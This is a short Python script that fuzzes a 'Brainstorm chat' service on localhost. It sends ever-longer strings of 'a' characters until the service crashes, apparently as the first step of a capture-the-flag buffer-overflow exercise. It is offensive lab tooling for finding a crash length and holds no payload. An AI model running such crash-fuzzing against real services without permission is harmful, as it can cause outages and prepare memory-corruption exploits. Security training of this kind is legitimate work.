#!/usr/bin/env python3

from pwn import *
import socket, sys, time

host = "127.0.0.1"
port = 9999
timeout = 2
payload = "a"*100

"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print(s.recv(1024)) # Welcome to Brainstorm chat (beta)
print(s.recv(1024)) # Please enter your username (max 20 characters):
s.send(bytes(payload, 'latin-1'))
print(s.recv(1024))
"""

while True:
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((host, port))
			s.recv(1024)
			s.recv(1024)
			s.send(bytes("Vuln", 'latin-1'))
			print(s.recv(1024))
			print(f"fuzzing with {len(payload)} characters...")
			s.send(bytes(payload, 'latin-1'))
			s.recv(1024)
	except:
		print(f"Application crashed at {len(payload)} bytes")
		sys.exit(0)

	payload += "a"* 200
